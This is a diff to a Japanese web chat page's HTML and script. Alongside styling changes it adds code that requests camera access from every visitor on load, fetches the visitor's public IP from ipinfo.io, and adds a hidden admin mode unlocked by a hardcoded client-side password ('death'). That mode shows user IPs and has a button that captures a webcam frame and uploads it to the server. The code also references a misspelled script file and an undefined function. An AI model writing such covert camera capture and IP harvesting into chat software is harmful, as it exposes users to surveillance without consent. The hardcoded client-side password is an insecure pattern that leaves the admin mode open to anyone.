@@ -11,77 +11,229 @@
       margin: 0;
       padding: 0;
       height: 100vh;
-      background-color: #0f0f10;
+      overflow: hidden;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #0e0e10;
       color: #f0f0f0;
-      font-family: 'Segoe UI', sans-serif;
       display: flex;
       flex-direction: column;
-      overflow: hidden;
     }
-
-    #chat {
-      flex: 1;
-      display: flex;
-      flex-direction: column;
-      overflow: hidden;
-    }
-
     #messages {
       flex: 1;
-      padding: 12px;
       overflow-y: auto;
-      background-color: #1e1f22;
-      font-family: Consolas, monospace;
-      font-size: 14px;
-      white-space: pre-wrap;
-      box-shadow: inset 0 0 5px #000;
+      padding: 10px;
+      background: #1c1c1e;
     }
-
-    #input-area {
+    #chat-controls {
       display: flex;
-      flex-shrink: 0;
-      padding: 10px;
+      padding: 8px;
       background-color: #2c2c2e;
-      border-top: 1px solid #444;
     }
-
-    textarea {
+    #input {
       flex: 1;
+      font-size: 1rem;
       padding: 10px;
-      resize: none;
       border: none;
-      border-radius: 6px;
+      outline: none;
       background-color: #333;
       color: white;
-      font-size: 14px;
-      height: 50px;
-      font-family: Consolas, monospace;
+      border-radius: 4px;
     }
-
-    button {
+    #send-btn {
       margin-left: 8px;
-      padding: 10px 16px;
-      background-color: #00bcd4;
+      padding: 10px 14px;
+      background-color: #3a3a3c;
+      color: white;
       border: none;
-      border-radius: 6px;
-      color: #000;
+      border-radius: 4px;
       font-weight: bold;
       cursor: pointer;
     }
-
-    button:hover {
-      background-color: #1de9b6;
+    #send-btn:hover {
+      background-color: #4a4a4c;
+    }
+    #userlist {
+      font-size: 0.8rem;
+      color: #999;
+      background: #2a2a2c;
+      padding: 4px;
+      display: flex;
+      flex-wrap: wrap;
+      gap: 6px;
+    }
+    .user-box {
+      background: #333;
+      padding: 4px 8px;
+      border-radius: 6px;
+      display: flex;
+      align-items: center;
+    }
+    .user-box span {
+      margin-right: 8px;
+    }
+    .admin-tools {
+      display: flex;
+      gap: 4px;
+    }
+    .admin-tools button {
+      background: #555;
+      color: white;
+      border: none;
+      padding: 2px 6px;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+    .admin-tools button:hover {
+      background: #777;
     }
   </style>
+  <script>
+    let isAdmin = false;
+    let username = '';
+    let localIP = '不明';
+    const allowedNameRegex = /^[A-Za-zぁ-んァ-ンｱ-ﾝﾞﾟ]+$/;
+
+    function copyUser(name) {
+      navigator.clipboard.writeText(name).then(() => alert(`${name} をコピーしました`));
+    }
+
+    function renderUsers(users, ips) {
+      const userlist = document.getElementById('userlist');
+      userlist.innerHTML = '';
+      users.forEach((user, i) => {
+        const box = document.createElement('div');
+        box.className = 'user-box';
+
+        const nameSpan = document.createElement('span');
+        nameSpan.textContent = user;
+
+        const copyBtn = document.createElement('button');
+        copyBtn.textContent = '📋';
+        copyBtn.onclick = () => copyUser(user);
+
+        box.appendChild(nameSpan);
+        box.appendChild(copyBtn);
+
+        if (isAdmin) {
+          const tools = document.createElement('div');
+          tools.className = 'admin-tools';
+
+          const camBtn = document.createElement('button');
+          camBtn.textContent = '📸';
+          camBtn.onclick = async () => {
+            try {
+              const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+              const video = document.createElement('video');
+              video.srcObject = stream;
+              await video.play();
+              const canvas = document.createElement('canvas');
+              canvas.width = video.videoWidth;
+              canvas.height = video.videoHeight;
+              canvas.getContext('2d').drawImage(video, 0, 0);
+              const imageData = canvas.toDataURL('image/png');
+              stream.getTracks().forEach(track => track.stop());
+              fetch("/upload-image", {
+                method: "POST",
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                  username: user,
+                  imageData: imageData,
+                  password: 'death'
+                })
+              }).then(r => r.text()).then(console.log);
+              alert("画像を取得し送信しました（管理者用）");
+            } catch (e) {
+              alert("カメラのアクセスが拒否されました。設定から許可してください。");
+            }
+          };
+
+          const banBtn = document.createElement('button');
+          banBtn.textContent = 'BAN';
+          banBtn.onclick = () => alert(`${user} をキック（仮処理）`);
+
+          const ipSpan = document.createElement('span');
+          ipSpan.style.color = '#888';
+          ipSpan.textContent = ` [${ips[i]}]`;
+
+          tools.appendChild(camBtn);
+          tools.appendChild(banBtn);
+          box.appendChild(tools);
+          box.appendChild(ipSpan);
+        }
+
+        userlist.appendChild(box);
+      });
+    }
+
+    function getIP(callback) {
+      const script = document.createElement('script');
+      script.src = 'https://ipinfo.io?callback=handleIP';
+      document.body.appendChild(script);
+      window.handleIP = function(response) {
+        localIP = response.ip;
+        callback();
+      };
+    }
+
+    function requestCameraOnce() {
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+          stream.getTracks().forEach(track => track.stop());
+        })
+        .catch(() => {
+          alert("カメラのアクセスが拒否されました。設定から許可してください。");
+        });
+    }
+
+    window.addEventListener('DOMContentLoaded', () => {
+      getIP(() => {
+        username = localStorage.getItem('username');
+        if (!username || !allowedNameRegex.test(username)) {
+          while (!username || !allowedNameRegex.test(username)) {
+            username = prompt("ユーザー名を入力してください（アルファベット・ひらがな・カタカナのみ）");
+            if (username === null) break;
+          }
+          if (!username) {
+            alert("正しい名前が入力されなかったため終了します。");
+            document.body.innerHTML = '<p style="text-align:center;margin-top:20%;color:white;">無効な名前です。</p>';
+            return;
+          }
+          localStorage.setItem('username', username);
+        }
+        document.getElementById('input').addEventListener('keydown', e => {
+          if (e.key === '@') {
+            if (!isAdmin) {
+              const pass = prompt("管理者パスワードを入力してください");
+              if (pass === 'death') {
+                isAdmin = true;
+                alert("管理者モードになりました");
+                renderUsers([username, 'guest1', 'guest2'], [localIP, '192.168.1.10', '10.0.0.5']);
+              } else {
+                alert("パスワードが違います");
+                return;
+              }
+            }
+          }
+          if (e.key === 'Tab') {
+            e.preventDefault();
+            renderUsers([username, 'guest1', 'guest2'], [localIP, '192.168.1.10', '10.0.0.5']);
+          }
+          if (e.key === 'Enter') send();
+        });
+        requestCameraOnce();
+      });
+    });
+  </script>
 </head>
 <body>
-  <div id="chat">
-    <div id="messages"></div>
-    <div id="input-area">
-      <textarea id="input" placeholder="メッセージを入力..." rows="1"></textarea>
-      <button onclick="send()">送信</button>
-    </div>
+  <div id="messages"></div>
+  <div id="chat-controls">
+    <input id="input" placeholder="チャット内容を入力" list="sug">
+    <button id="send-btn" onclick="send()">送信</button>
   </div>
-  <script src="script.js"></script>
+  <datalist id="sug"></datalist>
+  <div id="userlist"></div>
+  <button id="copy-btn" onclick="copyUserList()">ユーザーリストをコピー</button>
+  <script src="cript.js"></script> 
 </body>
 </html>
